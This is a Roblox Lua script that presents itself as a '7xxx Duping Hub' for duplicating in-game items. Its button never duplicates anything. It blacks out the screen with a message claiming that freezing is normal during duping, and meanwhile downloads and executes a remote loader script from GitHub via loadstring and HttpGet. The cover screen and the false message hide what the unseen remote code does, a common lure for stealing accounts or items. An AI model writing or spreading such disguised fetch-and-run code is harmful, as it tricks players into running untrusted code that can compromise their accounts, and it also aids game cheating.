-- Create main UI
local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "DupingUI"
gui.Parent = player:WaitForChild("PlayerGui")

-- Main frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75) -- Center screen
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui

-- Round corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "7xxx Duping Hub"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = mainFrame

-- Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.8, 0, 0, 40)
button.Position = UDim2.new(0.1, 0, 0.6, -20)
button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
button.TextColor3 = Color3.new(1, 1, 1)
button.Font = Enum.Font.Gotham
button.TextSize = 16
button.Text = "Start Duping Process"
button.Parent = mainFrame

-- Button corner
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = button

-- Function to create freeze screen
local function showFreezeMessage()
    local freezeGui = Instance.new("ScreenGui")
    freezeGui.Name = "FreezeMessage"
    freezeGui.IgnoreGuiInset = true
    freezeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    freezeGui.Parent = player:WaitForChild("PlayerGui")
    
    -- Black background
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.Parent = freezeGui
    
    -- Warning text
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(0.9, 0, 0, 100)
    text.Position = UDim2.new(0.05, 0, 0.5, -50)
    text.BackgroundTransparency = 1
    text.Text = "PLS WAIT - It's normal to freeze your game when duping"
    text.TextColor3 = Color3.new(1, 1, 1)
    text.Font = Enum.Font.SourceSansBold
    text.TextSize = 24
    text.TextWrapped = true
    text.TextXAlignment = Enum.TextXAlignment.Center
    text.TextYAlignment = Enum.TextYAlignment.Center
    text.Parent = freezeGui
    
    -- Loading dots animation
    coroutine.wrap(function()
        local dots = {".", "..", "...", "...."}
        while freezeGui and freezeGui.Parent do
            for i = 1, #dots do
                if not freezeGui or not freezeGui.Parent then break end
                text.Text = "PLS WAIT - It's normal to freeze your game when duping"..dots[i]
                task.wait(0.5)
            end
        end
    end)()
    
    return freezeGui
end

-- Button click handler
button.MouseButton1Click:Connect(function()
    -- Show freeze message
    local freezeScreen = showFreezeMessage()
    
    -- Execute after small delay to ensure message shows
    task.delay(0.5, function()
        -- Execute the script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
        end)
        
        -- Remove freeze screen after 15 seconds
        task.delay(15, function()
            if freezeScreen and freezeScreen.Parent then
                freezeScreen:Destroy()
            end
            
            if not success then
                warn("Script failed to load:", err)
            end
        end)
    end)
end)
